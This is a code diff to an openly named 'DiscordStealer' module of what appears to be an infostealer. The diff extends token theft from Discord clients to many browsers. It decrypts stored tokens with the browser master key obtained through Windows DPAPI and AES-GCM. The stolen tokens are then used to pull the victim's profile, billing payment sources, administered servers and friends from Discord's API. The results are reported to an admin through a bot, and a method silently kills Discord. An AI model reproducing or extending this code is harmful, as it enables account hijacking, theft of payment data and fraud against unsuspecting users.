@@ -5,11 +5,20 @@ import json
 import shutil
 import subprocess
 import time
+import base64
+import ctypes
 from typing import List, Dict, Any, Optional
+from pathlib import Path
 import clr
 import urllib.parse
 from core.obfuscation import decrypt_string
 from core.bridge_manager import bridge_manager
+
+try:
+    from Cryptodome.Cipher import AES
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
 
 DIVIDER = "—" * 30
 
@@ -27,8 +36,11 @@ try:
     from System.Reflection import Assembly
     from System.IO import File
     dll_name = "discord.dll"
-    # Search in current dir, core/ and native_modules/
+    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    # Search in bin/, native_modules/, and current core/ dir
     search_paths = [
+        os.path.join(base_dir, "bin", dll_name),
+        os.path.join(base_dir, "native_modules", dll_name),
         os.path.join(os.path.dirname(__file__), dll_name),
         os.path.join(os.path.dirname(__file__), "..", "native_modules", dll_name),
         os.path.join(os.getcwd(), "native_modules", dll_name)
@@ -56,6 +68,7 @@ class DiscordStealer(BaseModule):
     def __init__(self, bot=None, report_manager=None, temp_dir=None):
         super().__init__(bot, report_manager, temp_dir)
         self.token_pattern = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
+        self.encrypted_token_pattern = r"dQw4w9WgXcQ:[^\" \s<>]+"
         self.found_tokens = []
 
     def run(self) -> bool:
@@ -68,9 +81,9 @@ class DiscordStealer(BaseModule):
             
             if tokens and self.bot and self.report_manager:
                 self.log(f"Found {len(tokens)} tokens. Sending report...")
-                # Use standard attributes from BaseModule if available, or bot_token from main
-                # DiscordStealer previously took bot_token, but now uses self.bot.token
-                self.send_full_report(tokens, self.bot.token, self.report_manager.admin_id)
+                # self.bot is HiddenStealer instance, self.bot.bot is telebot.TeleBot
+                bot_token = getattr(self.bot, 'token', getattr(getattr(self.bot, 'bot', None), 'token', BOT_TOKEN))
+                self.send_full_report(tokens, bot_token, self.report_manager.admin_id)
             
             return True if tokens else False
         except Exception as e:
@@ -100,32 +113,125 @@ class DiscordStealer(BaseModule):
             except Exception as e:
                 log_debug(f"C# extraction error: {e}")
 
-        # 2. Basic Python Fallback (Minimal)
-        if not tokens:
+        # 2. Enhanced Python Fallback
+        try:
             appdata = os.environ.get('APPDATA', '')
-            paths = [os.path.join(appdata, 'discord', 'Local Storage', 'leveldb')]
-            for p in paths:
-                if not os.path.exists(p): continue
-                try:
-                    for f_name in os.listdir(p):
-                        if not f_name.endswith(('.log', '.ldb')): continue
-                        with open(os.path.join(p, f_name), 'r', errors='ignore') as f:
-                            content = f.read()
-                            found = re.findall(self.token_pattern, content)
-                            for t in found:
-                                clean = self._clean_token(t)
-                                if clean and clean not in tokens: tokens.append(clean)
-                except: pass
+            localappdata = os.environ.get('LOCALAPPDATA', '')
+            
+            # Target paths for Discord clients and Browsers
+            targets = {
+                'Discord': os.path.join(appdata, 'discord'),
+                'Discord Canary': os.path.join(appdata, 'discordcanary'),
+                'Discord PTB': os.path.join(appdata, 'discordptb'),
+                'Discord Development': os.path.join(appdata, 'discorddevelopment'),
+                'Lightcord': os.path.join(appdata, 'lightcord'),
+                'Chrome': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default'),
+                'Chrome Beta': os.path.join(localappdata, 'Google', 'Chrome Beta', 'User Data', 'Default'),
+                'Edge': os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default'),
+                'Brave': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
+                'Opera': os.path.join(appdata, 'Opera Software', 'Opera Stable'),
+                'Opera GX': os.path.join(appdata, 'Opera Software', 'Opera GX Stable'),
+                'Vivaldi': os.path.join(localappdata, 'Vivaldi', 'User Data', 'Default'),
+                'Yandex': os.path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
+            }
+
+            for name, path in targets.items():
+                if not os.path.exists(path): continue
+                
+                # Get master key for this path
+                master_key = self._get_master_key(path)
+                
+                # Scan leveldb and logs
+                search_dirs = [
+                    os.path.join(path, 'Local Storage', 'leveldb'),
+                    os.path.join(path, 'leveldb')
+                ]
+                
+                for s_dir in search_dirs:
+                    if not os.path.exists(s_dir): continue
+                    try:
+                        for f_name in os.listdir(s_dir):
+                            if not f_name.endswith(('.log', '.ldb')): continue
+                            f_path = os.path.join(s_dir, f_name)
+                            try:
+                                with open(f_path, 'r', errors='ignore') as f:
+                                    content = f.read()
+                                    
+                                    # Legacy unencrypted tokens
+                                    found = re.findall(self.token_pattern, content)
+                                    for t in found:
+                                        clean = self._clean_token(t)
+                                        if clean and clean not in tokens: tokens.append(clean)
+                                        
+                                    # Encrypted tokens v10
+                                    if master_key and CRYPTO_AVAILABLE:
+                                        enc_found = re.findall(self.encrypted_token_pattern, content)
+                                        for t_enc in enc_found:
+                                            try:
+                                                raw_enc = t_enc.split(':', 1)[1]
+                                                decrypted = self._decrypt_token(base64.b64decode(raw_enc), master_key)
+                                                if decrypted:
+                                                    clean = self._clean_token(decrypted)
+                                                    if clean and clean not in tokens: tokens.append(clean)
+                                            except: pass
+                            except: pass
+                    except: pass
+        except Exception as e:
+            log_debug(f"Python fallback error: {e}")
 
         return {'tokens': tokens}
 
-    def get_api_data(self, token: str) -> Dict[str, Any]:
-        """Retrieve data via Discord API with Bridge support"""
-        import urllib.request
-        import base64
+    def _get_master_key(self, path: str) -> Optional[bytes]:
+        """Extracts master key from Local State file using DPAPI"""
+        local_state_path = os.path.join(path, "Local State")
+        if not os.path.exists(local_state_path):
+            # Try parent for browsers (User Data level)
+            local_state_path = os.path.join(os.path.dirname(path), "Local State")
+            if not os.path.exists(local_state_path): return None
 
-        results: Dict[str, Any] = {}
-        
+        try:
+            with open(local_state_path, "r", encoding="utf-8") as f:
+                local_state = json.load(f)
+            
+            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            if not encrypted_key.startswith(b"DPAPI"): return None
+            
+            encrypted_key = encrypted_key[5:] # Strip DPAPI prefix
+            
+            # Windows DPAPI Call
+            class DATA_BLOB(ctypes.Structure):
+                _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.POINTER(ctypes.c_char))]
+
+            p_data_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
+            p_data_out = DATA_BLOB()
+
+            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_data_in), None, None, None, None, 0, ctypes.byref(p_data_out)):
+                key = ctypes.string_at(p_data_out.pbData, p_data_out.cbData)
+                ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
+                return key
+        except: pass
+        return None
+
+    def _decrypt_token(self, buffer: bytes, master_key: bytes) -> Optional[str]:
+        """Decrypts AES-GCM encrypted token using master key"""
+        try:
+            iv = buffer[3:15]
+            payload = buffer[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted = cipher.decrypt(payload)
+            # Remove auth tag at the end (16 bytes)
+            decrypted = decrypted[:-16].decode()
+            return decrypted
+        except: return None
+
+    def _api_request(self, path: str, token: str) -> Optional[Any]:
+        """Base Discord API requester with bridge support"""
+        import urllib.request
+        import urllib.parse
+        import base64
+        import json
+
+        # Prepare headers
         super_props = base64.b64encode(json.dumps({
             "os": "Windows", "browser": "Chrome", "device": "", "system_locale": "en-US",
             "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
@@ -140,27 +246,30 @@ class DiscordStealer(BaseModule):
             "X-Super-Properties": super_props
         }
 
-        # Resolve Route (Direct or Bridge)
+        # Resolve Route
         route = bridge_manager.get_best_route()
         use_bridge = route and route.get('type') == 'bridge'
         bridge_url = route.get('bridge_url') if use_bridge else None
 
-        def api_request(path: str) -> Optional[Dict]:
-            try:
-                target_url = f"https://discord.com/api/v9{path}"
-                if use_bridge:
-                    final_url = f"{bridge_url}?path={urllib.parse.quote(target_url)}"
-                else:
-                    final_url = target_url
+        try:
+            target_url = f"https://discord.com/api/v9{path}"
+            if use_bridge:
+                final_url = f"{bridge_url}?path={urllib.parse.quote(target_url)}"
+            else:
+                final_url = target_url
 
-                req = urllib.request.Request(final_url, headers=headers)
-                with urllib.request.urlopen(req, timeout=10) as resp:
-                    return json.loads(resp.read().decode())
-            except: 
-                return None
+            req = urllib.request.Request(final_url, headers=headers)
+            with urllib.request.urlopen(req, timeout=12) as resp:
+                return json.loads(resp.read().decode())
+        except:
+            return None
 
+    def get_api_data(self, token: str) -> Dict[str, Any]:
+        """Retrieve data via Discord API with Bridge support"""
+        results: Dict[str, Any] = {}
+        
         # 1. User Info
-        user_data = api_request("/users/@me")
+        user_data = self._api_request("/users/@me", token)
         if user_data and isinstance(user_data, dict):
             nitro_type = user_data.get('premium_type', 0)
             nitro_map = {0: "None", 1: "Nitro Classic", 2: "Nitro Full (Boost)", 3: "Nitro Basic"}
@@ -176,7 +285,7 @@ class DiscordStealer(BaseModule):
             }
 
         # 2. Billing
-        billing = api_request("/users/@me/billing/payment-sources")
+        billing = self._api_request("/users/@me/billing/payment-sources", token)
         if billing and isinstance(billing, list):
             methods = []
             for b in billing:
@@ -188,12 +297,12 @@ class DiscordStealer(BaseModule):
             results['billing'] = methods
 
         # 3. Guilds (Admin)
-        guilds = api_request("/users/@me/guilds")
+        guilds = self._api_request("/users/@me/guilds", token)
         if guilds and isinstance(guilds, list):
             results['guilds'] = [g['name'] for g in guilds if isinstance(g, dict) and (g.get('owner') or (int(g.get('permissions', 0)) & 0x8))]
 
         # 4. Relationships
-        rel = api_request("/users/@me/relationships")
+        rel = self._api_request("/users/@me/relationships", token)
         if rel and isinstance(rel, list):
             friends = [r for r in rel if isinstance(r, dict) and r.get('type') == 1]
             results['friends_count'] = len(friends)
@@ -201,6 +310,7 @@ class DiscordStealer(BaseModule):
             results['friends_sample'] = [f.get('user', {}).get('username', 'Unknown') for f in friends[:3] if isinstance(f, dict)]
 
         return results
+
 
     def logout(self):
         """Silently kill Discord and clear session data"""
